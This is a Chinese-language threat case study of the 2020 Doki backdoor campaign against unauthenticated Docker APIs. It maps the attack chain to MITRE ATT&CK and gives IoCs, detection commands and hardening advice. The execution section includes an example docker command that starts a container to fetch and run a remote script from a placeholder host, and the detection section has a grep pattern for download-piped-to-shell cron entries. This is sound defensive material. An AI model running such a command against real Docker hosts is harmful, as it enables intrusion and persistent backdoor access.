# 攻击案例: Doki Backdoor 云端 Docker 入侵（Dogecoin 链上 DGA）

Project: Doki Backdoor Docker Campaign
Date: 2020-07-29
Severity: High

**攻击者**: 未公开（与 Ngrok Botnet 活动相关联）
**时间**: 2020（披露时）
**目标**: 公网暴露且未认证的 Docker Engine API（Docker daemon），云主机/云容器环境
**攻击类型**: 后门远程命令执行、持久化驻留、云端横向扩展

## 案例概述

Doki 是一类面向 Linux 的后门载荷，常被投递到“对外暴露 Docker API”的云端 Docker 服务器上。其传播链条通常从攻击者扫描并利用未授权的 Docker daemon 开始，通过创建容器并使用挂载（bind mount）等方式扩大对宿主机文件系统的访问，随后下载并执行多阶段脚本与二进制载荷。Doki 的显著特点是使用 Dogecoin 区块链相关数据作为输入，动态生成 C2 域名（基于 DynDNS 的 `ddns.net`），从而提升其基础设施的抗封禁能力。

**关键事实**:
- 入口: 公网暴露且无认证的 Docker Engine API（常见为 TCP `2375`）
- 执行与投递: 通过创建临时容器拉取脚本与二进制载荷，并可借助挂载机制影响宿主机文件系统
- C2 机制: 通过链上数据驱动的 DGA 动态生成 `*.ddns.net` 域名用于回连

## 攻击链分析

### 1. 初始访问 (Initial Access)

**技术**: 暴露的 API 端点扫描
**MITRE ATT&CK**: T1190 - Exploit Public-Facing Application

攻击者对互联网暴露的 Docker daemon 进行自动化扫描与探测，在发现可直接访问的 Docker API 后获取远程创建容器与执行命令的能力。

### 2. 执行 (Execution)

**技术**: 部署恶意容器
**MITRE ATT&CK**: T1610 - Deploy Container

攻击者通过 Docker API 创建容器作为执行载体，运行下载器脚本拉取后续 payload，并在容器内启动后门。

**执行命令示例**:
```bash
docker -H tcp://victim:2375 run -d --restart=always alpine:latest sh -c "wget -qO- http://example/payload.sh | sh"
```

### 3. 持久化 (Persistence)

**技术**: 修改计划任务（Cron）
**MITRE ATT&CK**: T1053.003 - Scheduled Task/Job: Cron

在具备对宿主机文件系统的写入能力时，攻击者可通过修改宿主机的 Cron 配置，周期性执行下载器/后门，从而维持驻留。

### 4. 权限提升 (Privilege Escalation)

**技术**: 容器边界突破到宿主机（依赖环境配置）
**MITRE ATT&CK**: T1611 - Escape to Host

当 Docker daemon 暴露且允许攻击者创建带有高权限挂载的容器时，攻击者可通过挂载宿主机文件系统、写入宿主机路径等方式扩大控制面，进一步影响宿主机与同主机上的其他工作负载。

### 5. 命令与控制 (Command and Control)

**技术**: 动态解析（DGA + 动态 DNS）
**MITRE ATT&CK**: T1568.003 - Dynamic Resolution: DNS

Doki 使用链上数据作为输入生成子域名，并拼接到 `ddns.net` 等动态 DNS 域名下进行回连。公开材料中出现过类似 `6d77335c4f23.ddns.net` 的 C2 域名形式。

### 6. 横向移动 (Lateral Movement)

**技术**: 在云端环境中发现并扩展更多可利用目标（依赖环境与脚本能力）
**MITRE ATT&CK**: T1613 - Container and Resource Discovery

在获得宿主机/云环境的更多信息后，攻击者可持续扫描同网段或云 IP 段内的暴露服务，寻找新的 Docker API 目标以扩展感染面。

### 7. 影响 (Impact)

**技术**: 工具与载荷持续投递
**MITRE ATT&CK**: T1105 - Ingress Tool Transfer

Doki 的目标偏向“持续可控的后门能力”，可为进一步的数据窃取、破坏或投递其他恶意载荷提供落点。

## TTP 映射

| MITRE ATT&CK ID | 技术名称 | 描述 |
|-----------------|---------|------|
| T1190 | Exploit Public-Facing Application | 扫描并利用暴露的 Docker API |
| T1610 | Deploy Container | 通过 Docker API 创建容器执行投递 |
| T1053.003 | Scheduled Task/Job: Cron | 修改 Cron 维持周期性执行 |
| T1611 | Escape to Host | 通过挂载等方式扩大到宿主机控制面 |
| T1568.003 | Dynamic Resolution: DNS | 通过 DGA + 动态 DNS 解析 C2 |
| T1613 | Container and Resource Discovery | 发现更多容器/资源与可利用目标 |
| T1105 | Ingress Tool Transfer | 持续下载并投递二阶段工具与载荷 |

## 威胁指标 (IoC)

**域名形态**:
- `*.ddns.net`（子域名通常为 12 位十六进制字符）

**网络行为**:
- 对外联 `dogechain.info`（或类似区块链浏览器 API）进行查询
- 对外联 `*.ddns.net` 的 HTTPS/HTTP 回连
- 对外联 `ngrok.io` 相关域名/URL 获取短时效下载链接（如环境中存在）

## 检测方法

### 主机/Docker 层检测

```bash
# 检查 Docker daemon 是否对外监听高风险端口
ss -lntp | grep -E ":2375|:2376"

# 排查是否存在异常容器创建/频繁创建删除痕迹（按环境日志源调整）
docker ps -a --no-trunc | head
```

### 持久化排查（Cron）

```bash
# 宿主机计划任务检查
crontab -l 2>/dev/null || true
ls -la /etc/cron.* /var/spool/cron 2>/dev/null
grep -R --line-number -E "(wget|curl).*\\|\\s*(sh|bash)" /etc/cron* /var/spool/cron 2>/dev/null | head
```

### 网络/域名侧检测

```bash
# 查找对 dogechain / ddns 的访问（示例：按实际日志位置调整）
grep -R --line-number -E "(dogechain\\.info|\\.ddns\\.net)" /var/log 2>/dev/null | head
```

## 防护建议

### 预防措施

1. **禁止 Docker daemon 直接暴露公网**：优先使用本地 socket；如必须开放，启用 TLS/mTLS 并配合网络 ACL 限制来源。
2. **最小权限运行容器与限制挂载**：避免允许不受信任的工作负载挂载宿主机根目录、Docker socket 等高风险路径。
3. **运行时与变更监控**：对异常容器创建、Cron 变更、异常外联（`*.ddns.net`、区块链 API）建立告警。

## 参考资料

- [Intezer: Watch Your Containers: Doki Infecting Docker Servers in the Cloud](https://intezer.com/blog/cloud-security/watch-your-containers-doki-infecting-docker-servers-in-the-cloud/)
- [Threatpost: Doki Backdoor Infiltrates Docker Servers in the Cloud](https://threatpost.com/doki-backdoor-docker-servers-cloud/157871/)
- [Cyber Swachhta Kendra: Doki](https://www.csk.gov.in/alerts/Doki.html)

## 时间线

| 日期 | 事件 |
|------|------|
| 2020-01 | 公开分析提及样本在该时间点前后被观察到并长期低检出率 |
| 2020-07 | 研究报告披露 Doki 作为 Docker 入侵链条中的后门载荷与链上 DGA 特征 |
